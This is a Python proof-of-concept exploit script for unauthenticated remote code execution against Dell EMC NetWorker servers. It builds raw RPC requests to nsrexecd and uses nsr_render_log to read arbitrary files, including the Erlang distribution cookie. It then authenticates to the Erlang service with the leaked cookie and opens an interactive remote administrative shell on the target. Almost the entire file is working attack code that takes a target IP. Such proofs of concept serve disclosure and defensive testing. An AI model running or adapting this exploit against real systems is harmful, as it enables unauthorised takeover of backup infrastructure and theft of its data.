#!/usr/bin/env python3
'''
Proof of concept for unauthenticated remote code execution affecting
Dell EMC Networker Server via nsr_render_log.

The script connects to nsrexecd remotely as administrative user using
oldauth and call 'nsr_render_log' script in order to read the Erlang
cookie file. It then authenticates to the Erlang Distribution Server
with that cookie and gain remote administrative shell on the system.

Author: Quentin Kaiser <kaiserquentin@gmail.com>
'''

import sys
import socket
import struct
from random import randint
import re
from random import choice
from string import ascii_uppercase
from hashlib import md5
import erlang as erl

def rand_id(n=6):
    return b"123456@nowhere"
    return b''.join([choice(ascii_uppercase) for c in range(n)]) + b'@nowhere'

def send_name(name):
    return struct.pack('!HcHI', 7 + len(name), b'n', 5, 0x3499c) + name

def send_challenge_reply(cookie, challenge):
   m = md5()
   m.update(cookie.encode('utf-8'))
   m.update(challenge.encode('utf-8'))
   response = m.digest()
   return struct.pack('!HcI', len(response)+5, b'r', 0) + response

# Once connected, protocol between us and victim is described
# at http://erlang.org/doc/apps/erts/erl_dist_protocol.html#protocol-between-connected-nodes
# it is roughly a variant of erlang binary term format
# the format also depends on the version of ERTS post (incl.) or pre 5.7.2
# the format used here is based on pre 5.7.2, the old one

def encode_string(name, type=0x64):
  return struct.pack('!BH', type, len(name)) + name

def send_cmd_old(name, cmd):
  data = (unhexlify('70836804610667') +
    encode_string(name) +
    unhexlify('0000000300000000006400006400037265') +
    unhexlify('7883680267') +
    encode_string(name) +
    unhexlify('0000000300000000006805') +
    encode_string('call') +
    encode_string('os') +
    encode_string('cmd') +
    unhexlify('6c00000001') +
    encode_string(cmd, 0x6b) +
    unhexlify('6a') +
    encode_string('user'))

  return struct.pack('!I', len(data)) + data

def send_cmd(name, cmd):
  # REG_SEND control message
  ctrl_msg = (6,
    erl.OtpErlangPid(erl.OtpErlangAtom(name),'\x00\x00\x00\x03','\x00\x00\x00\x00','\x00'),
    erl.OtpErlangAtom(''),
    erl.OtpErlangAtom('rex'))
  msg = (
    erl.OtpErlangPid(erl.OtpErlangAtom(name),'\x00\x00\x00\x03','\x00\x00\x00\x00','\x00'),
    (
      erl.OtpErlangAtom('call'),
      erl.OtpErlangAtom('os'),
      erl.OtpErlangAtom('cmd'),
      [cmd],
      erl.OtpErlangAtom('user')
    ))
  new_data = b'\x70' + erl.term_to_binary(ctrl_msg) + erl.term_to_binary(msg)
  return struct.pack('!I', len(new_data)) + new_data

def recv_reply(f):
    hdr = f.recv(4)
    if len(hdr) != 4: return
    (length,) = struct.unpack('!I', hdr)
    data = f.recv(length)
    if len(data) != length: return

    # remove 0x70 from head of stream
    return data[4:]

def get_erlang_distribution_port(host, port=4369):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    assert(sock)
    sock.connect((host, port))
    sock.sendall(b"\x00\x01\x6e")
    data = sock.recv(4)
    assert(data == b"\x00\x00\x11\x11")
    data = sock.recv(1024)
    matches = re.findall(r'name ([^ ]+) at port ([0-9]+)\n', data.decode('utf-8'))
    if matches:
        service_name, port = matches[0]
        print("[+] Got Erlang distribution port for service ({}) on port {}".format(service_name, port))
    sock.close()
    return int(port)

def connect_erldp(host, port, cookie):
    name = rand_id()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    assert(sock)

    sock.connect((host, port))
    sock.sendall(send_name(name))
    data = sock.recv(5)
    assert(data == b'\x00\x03\x73\x6f\x6b')

    data = sock.recv(4096)
    (length, tag, version, flags, challenge) = struct.unpack('!HcHII', data[:13])
    challenge = '%u' % challenge
    sock.sendall(send_challenge_reply(cookie, challenge))
    data = sock.recv(3)
    if len(data) == 0:
        print('wrong cookie, auth unsuccessful')
        sys.exit(1)
    else:
        assert(data == b'\x00\x11\x61')
        digest = sock.recv(16)
        assert(len(digest) == 16)
    print('[*] authenticated onto victim')

    try:
        while True:
            try:
                cmd = input('%s:%d $ ' % (host, port))
            except EOFError:
                print('')
                break
            sock.sendall(send_cmd(name, cmd.encode('utf-8')))
            reply = recv_reply(sock)
            sys.stdout.write(reply[41:].decode('utf-8'))
    except KeyboardInterrupt as e:
        pass
    finally:
        print('\n[*] disconnecting from victim')
        sock.close()

def print_response(response):
    for i in range(0, len(response)-4):
        print(response[i:i+4].hex())

client_hostname = b"\x00" * 16

#domain_name = socket.gethostbyaddr("192.168.121.1")[0]
#client_hostname = domain_name.encode('utf-8')
instruction = b"command"

def add_header(rpc_request):
    '''compute RPC header'''
    rpc_header = struct.pack(">I", 0x80000000 + len(rpc_request))
    return rpc_header + rpc_request

def pad(content, pad_len=4):
    return content + b"\x00" * (pad_len - (len(content) % pad_len))


def rpc_base_windows(oldauth=True):
    '''craft RPC base request'''
    # craft_rpc_header
    rpc_request = b""
    rpc_request += struct.pack(">I", 0xff041884) # XID
    rpc_request += struct.pack(">I", 0x00000000) # message_type
    rpc_request += struct.pack(">I", 0x00000002) # rpc version
    rpc_request += struct.pack(">I", 0x0005f3e1) # rpc program
    rpc_request += struct.pack(">I", 0x00000001) # program version
    rpc_request += struct.pack(">I", 0x00000006) # rpc procedure
    rpc_request += struct.pack(">I", 0x00000001) # unknown
    rpc_request += struct.pack(">I", 0x00000028) # unknown
    rpc_request += struct.pack(">I", 0x00000dc9) # XID

    if oldauth:
        # oldauth, we add the client hostname
        rpc_request += struct.pack(">I", len(client_hostname))
        rpc_request += pad(client_hostname, pad_len=4)
        rpc_request += struct.pack(">I", 0x00000000) # padding

        # user attr
        rpc_request += struct.pack(">I", 0xfffffffe) # user id
        rpc_request += struct.pack(">I", 0x00000001) # xxx

        rpc_request += struct.pack(">I", 0xfffffffe) # user id
        rpc_request += struct.pack(">I", 0x00000000) # xxx

        rpc_request += struct.pack(">I", 0x00000000) # padding

        rpc_request += struct.pack(">I", 0x00000001) # ?
        rpc_request += struct.pack(">I", 0x00000071) # ?
        rpc_request += struct.pack(">I", 0x00000001) # ?

    return rpc_request

def rpc_base(oldauth=True):
    '''craft RPC base request'''
    # craft_rpc_header
    rpc_request = b""
    rpc_request += struct.pack(">I", 0x5ebb5810) # XID
    rpc_request += struct.pack(">I", 0x00000000) # message_type
    rpc_request += struct.pack(">I", 0x00000002) # rpc version
    rpc_request += struct.pack(">I", 0x0005f3e1) # rpc program
    rpc_request += struct.pack(">I", 0x00000001) # program version
    rpc_request += struct.pack(">I", 0x00000006) # rpc procedure
    rpc_request += struct.pack(">I", 0x00000001) # unknown
    rpc_request += struct.pack(">I", 0x00000030) # unknown
    rpc_request += struct.pack(">I", 0x5ebb5810) # XID

    if oldauth:
        # oldauth, we add the client hostname
        rpc_request += struct.pack(">I", len(client_hostname))
        rpc_request += pad(client_hostname, pad_len=4)

        # TLV
        rpc_request += struct.pack(">I", 0x00000000) # type
        rpc_request += struct.pack(">I", 0x00000000) # length
        rpc_request += struct.pack(">I", 0x00000002) # value

        # TLV
        rpc_request += struct.pack(">I", 0x00000000) # type
        rpc_request += struct.pack(">I", 0x00000000) # length
        rpc_request += struct.pack(">I", 0x00000000) # value

        # TLV
        rpc_request += struct.pack(">I", 0x00000000) # type
        rpc_request += struct.pack(">I", 0x00000001) # length
        rpc_request += struct.pack(">I", 0x00000071) # value

        # unknown
        rpc_request += struct.pack(">I", 0x00000001) # ?
    return rpc_request

def craft_rpc_request(command, os='linux'):
    '''craft rpc command request'''

    if os == 'linux':
        rpc_request = rpc_base()
    else:
        rpc_request = rpc_base_windows()
    # TLV (instruction)
    rpc_request += struct.pack(">I", 0x00000001) # type
    rpc_request += struct.pack(">I", len(instruction)) # length
    rpc_request += pad(instruction)

    # TLV (command)
    rpc_request += struct.pack(">I", 0x00000001) # type
    rpc_request += struct.pack(">I", len(command)) # length
    rpc_request += pad(command)

    rpc_request += struct.pack(">I", 0x00000000)
    rpc_request += struct.pack(">I", 0x00000000)

    rpc_payload = add_header(rpc_request)
    return rpc_payload

def confirm_payload():
    '''confirmation payload'''
    payload = b""
    payload += struct.pack(">I", 0x00000007)
    payload += struct.pack(">I", 0x00000000)
    payload += struct.pack(">I", 0x00000001)
    payload += struct.pack(">I", 0x00000001)
    payload += struct.pack(">I", 0x00000000)
    return payload

def read_file(host, filename, os='linux'):

    output = b""
    command = "nsr_render_log {}".format(filename).encode('utf-8')
    payload = craft_rpc_request(command, os)

    command_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    command_socket.connect((host, 7937))
    command_socket.sendall(payload)
    data = command_socket.recv(1024)
    command_socket.sendall(confirm_payload())
    while True:
        data = command_socket.recv(1024)
        output += data
        if b"\x80\x00\x00\x03\x00\x00\x00\x01" in data:
            command_socket.close()
            break
    command_socket.close()
    return output

def rce(host):
    matcher = re.compile(b'Unable to render the following message: ([^\n]+)', re.MULTILINE)
    file_content = read_file(host, '/etc/hosts')
    if b"No such file or directory" in file_content:
        print("[+] Target seems to be Windows")
        version_filename = '"C:\\\\Program Files\\\\EMC NetWorker\\\\nsr\\\\authc-server\\\\tomcat\\\\webapps\\\\nwrestapi\\\\WEB-INF\\\\api.xml"'
        cookie_filename = '"C:\\\\Windows\\\\.erlang.cookie"'
    else:
        print("[+] Target seems to be Linux")
        version_filename = "/nsr/authc/webapps/nwrestapi/WEB-INF/api.xml"
        cookie_filename = "/nsr/rabbitmq/.erlang.cookie"

    file_content = read_file(host, version_filename)
    version = re.findall(b'<Version>([^<]*)', file_content)
    print("[+] Target is running EMC Networker {}".format(version[0].decode('utf-8')))

    file_content = read_file(host, cookie_filename)
    matches = matcher.findall(file_content)
    if matches:
        erlang_cookie = matches[0].decode('utf-8')
        print("[+] Leaked Erlang distribution cookie through path traversal.")
        print("[+] Cookie value: {}".format(erlang_cookie))
        port = get_erlang_distribution_port(host)
        connect_erldp(host, port, erlang_cookie)
    else:
        print("[!] Something bad happened when trying to leak the Erlang cookie.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: {} target_ip".format(sys.argv[0]))
        sys.exit(-1)
    rce(sys.argv[1])
